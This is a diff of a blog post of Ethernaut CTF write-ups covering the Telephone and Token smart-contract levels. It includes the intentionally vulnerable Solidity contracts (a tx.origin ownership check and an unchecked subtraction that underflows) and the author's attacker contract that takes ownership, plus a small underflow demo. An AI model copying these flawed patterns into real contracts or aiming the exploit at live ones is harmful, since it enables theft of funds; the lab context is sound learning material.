@@ -1,5 +1,5 @@
 ---
-title: Ethernaut Writeups 
+title: Ethernaut Writeups Part-1
 tags:
 - technology
 - blockchain
@@ -10,15 +10,15 @@ Starting my the second phase of my blockchain security journey [First one here](
 
 <!--more-->
 
-Some may say I still don't know many things about blockchain, how will I ever secure it? That's the beauty of top-down learning. You learn as you go. It's not the typical routine of learn the thoery and then get the hand dirty. I beleive in learning on the job. With that out of the way... Lets dive into my first solve.
+Some may say I still don't know many things about blockchain, how will I ever secure it? That's the beauty of top-down learning. You learn as you go. It's not the typical routine of learn the theory and then get the hands dirty. I believe in learning on the job. With that out of the way... Lets dive into my first solve.
 
 # Hello Ethernaut
 
 [Play along](https://ethernaut.openzeppelin.com/level/0x4E73b858fD5D7A5fc1c3455061dE52a53F35d966)
 
-So first we just follow the basic setup guide, which is pretty clear. We interact with the challenges using the web console in our browsers. Here is where some might face trouble. The link provided in the guide to get test ether (which is required to play) does not work. [Here is an alternative I found](https://faucets.chain.link/rinkeby). It only gives 0.1 Ether, but that much is enough to play these challenges.
+So first we just follow the basic setup guide, which is pretty clear. We interact with the challenges using the web console in our browsers. Here is where some might face trouble. The link provided in the guide to get test ether (which is required to play) does not work. [Here is an alternative I found](https://faucets.chain.link/rinkeby). It only gives 0.1 Ether at a time, but that much is enough to play these challenges.
 
-Also if cant call the "player" or "ethernaut" functions and variables, try opening the console and refreshing the page. Starting the challenge. It is pretty easy since this is just an example challenge. The challenge said to look into contract.info() to start.
+Also if you cant call the "player" or "ethernaut" functions and variables, try opening the console and refreshing the page. Starting the challenge. It is pretty easy since this is just an example challenge. The challenge said to look into contract.info() to start.
 
 ![](https://i.imgur.com/MarT8Ve.png)
 
@@ -358,3 +358,131 @@ Just remember to do it real slow. We have to call this button 10 times to clear 
 ![](https://i.imgur.com/7KKE7pI.png)
 
 The lesson in this challenge was that , there isn't any native way to produce true random numbers in solidity yet, because all the data and variables are visible to everyone. The author recommends  Chainlink VRF, Bitcoin block headers (verified through BTC Relay), RANDAO, or Oraclize to generate random numbers.
+
+# Telephone
+
+Another easy challenge. Just make a smart contract like the previous one and we are done. Lets see the source code and then the solution.
+
+{%highlight text%}
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract Telephone {
+
+  address public owner;
+
+  constructor() public {
+    owner = msg.sender;
+  }
+
+  function changeOwner(address _owner) public {
+    if (tx.origin != msg.sender) {
+      owner = _owner;
+    }
+  }
+}
+{%endhighlight%}
+
+I saw the difference between tx.origin and msg.sender. Tx.origin refers to the original account that started the transfer. Msg.sender refers to the immediate account which did the transfer. [Here is a good explaination](https://www.oreilly.com/library/view/solidity-programming-essentials/9781788831383/3d3147d9-f79f-4a0e-8c9f-befee5897083.xhtml)
+
+So in this case we just need it so that the original sender is not the immediate sender too. Which  means we need to send the ether via a contract so that tx.origin will be our address and msg.sender will be the address of our deployed contract.
+
+My code:
+
+{%highlight text%}
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.5.0;
+
+interface Telephone{
+    function changeOwner(address _owner) external;
+}
+
+contract phonyphone{
+    address public myAddress;
+    Telephone public object=Telephone(0xA3a30058F1EcB31d0735B579588479B0B0d517b1);
+
+    function getaddr(address _address) public{
+        myAddress=_address;
+    }
+
+    function caller() public{
+        object.changeOwner(myAddress);
+    }
+}
+{%endhighlight%}
+
+Pretty straight forward, I create an interface of the level's contract and then create a contract of my own which takes our address using getaddr() and then gives it to the level's contract function called changeOwner(). 
+
+Since tx.origin and msg.sender may represent two different addresses, It can be used to perform phishing attacks. Note from author:
+
+![](https://i.imgur.com/GfEjlns.png)
+
+# Token
+
+Ooohhh... I liked this challenge a lot. Not much work to do like making another contract. Just one simple function call with a hackey value.
+
+Lets see the source code:
+
+{%highlight text%}
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract Token {
+
+  mapping(address => uint) balances;
+  uint public totalSupply;
+
+  constructor(uint _initialSupply) public {
+    balances[msg.sender] = totalSupply = _initialSupply;
+  }
+
+  function transfer(address _to, uint _value) public returns (bool) {
+    require(balances[msg.sender] - _value >= 0);
+    balances[msg.sender] -= _value;
+    balances[_to] += _value;
+    return true;
+  }
+
+  function balanceOf(address _owner) public view returns (uint balance) {
+    return balances[_owner];
+  }
+}
+{%endhighlight%}
+
+In the desciption of challenge we see that we have been given 20 tokens and we need to increase it to more than 20, specifically some absurdly large value. (Most seasoned hackers may have already caught whats going to happen).
+
+Okay. First we see a mapping of addresses and their balance. Then we see a simple constructor. fair enough. Then we see a transfer function that takes an address and a value, and then transfers that amount from the sender to receiver. And the last function shows us the balance of addresses.
+
+The hint says if we know what an odometer is. At first I thought it was an etherium or a blockchain concept I didn't know. Which landed me on this [awesome article](https://medium.com/loom-network/how-to-secure-your-smart-contracts-6-solidity-vulnerabilities-and-how-to-avoid-them-part-1-c33048d4d17d)
+
+Just like odometers which after hitting 999999 go back to 000000 solidity also has this underflow and overflow mechanism. (read the above article)
+
+Half of my work was done. I knew what I had to do. This challenge was about overflows and underflows in unsigned integers. unsigned integers do not have any signs so basically they only know +ve values. if we make them go negative then go back up and become the largest value they can be. 
+
+In this one we had to underflow the amount in our balance so that it turns around and goes to the max amount possible. I checked the balances in both my account and the level's account first.
+
+![](https://i.imgur.com/JiQUEHT.png)
+
+We have a clue already. We have 20 and the level has 20999980 tokens. I knew I had to transfer some wierd amount somewhere. Just didn't know to who and how much. from the hint is looks like we need to send it to the level's Instance and now it was a matter of how much. I did some tests by creating a contract in Remix IDE to see how underflow and overflow worked in solifity.
+
+{%highlight text%}
+contract overunder{
+  uint balance=20;
+
+  function reduce() public returns(uint newbalance) {
+      return balance-21;
+  }
+}
+{%endhighlight%}
+
+The output was just as I predicted it. I had near infinite tokens now. I knew what I had to do. Before writing this contract I was still confused but changing values and implementing it made everything clear.
+
+Here is how I solved the challenge.
+
+![](https://i.imgur.com/OXoWXvQ.png)
+
+We can see that our balance increased way more than rather than decreasing to -1. So cool!
+
+Author's note said that we can use OpenZeppelin's SafeMath library known as [SafeMath.sol](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol) to perform safe additions and subtractions.
+
+I will end this part here and continue in part 2!
